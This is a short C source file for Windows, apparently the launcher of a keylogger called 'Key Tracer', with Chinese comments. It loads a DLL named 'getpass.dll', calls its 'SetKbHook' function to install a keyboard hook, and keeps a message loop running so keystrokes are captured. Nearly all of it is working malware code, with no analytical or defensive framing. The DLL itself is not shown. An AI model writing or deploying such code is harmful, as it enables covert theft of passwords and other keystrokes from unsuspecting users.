include "ktr.h"
//win 函数入口
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpszCmdLine, int nCmdShow)
{
    MSG msg;
    char text[] = "Error loading DLL!";
    char title[] = "Key Tracer";
    BOOL error = FALSE;
    HINSTANCE	dllhinst;
    //创建安装钩子函数指针，用来记录dll中安装钩子的地址
    typedef VOID (CALLBACK * LPFNDLLFUNC1)(VOID);
    LPFNDLLFUNC1 lpfnDllFunc1;
    //加载钩子dll
    dllhinst = LoadLibrary("getpass.dll");
    //判断是否加载dll成功
    if (dllhinst != NULL)
    {
        lpfnDllFunc1 = (LPFNDLLFUNC1)GetProcAddress(dllhinst, "SetKbHook");
        if (!lpfnDllFunc1)
        {
            FreeLibrary(dllhinst);
            error = TRUE;
        }
        else
        {
            lpfnDllFunc1();
        }
    }
    else error = TRUE;

    if (error)
        MessageBox(GetDesktopWindow(), text, title, MB_OK);

    while (GetMessage(&msg, 0, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    };
    return msg.wParam;
}
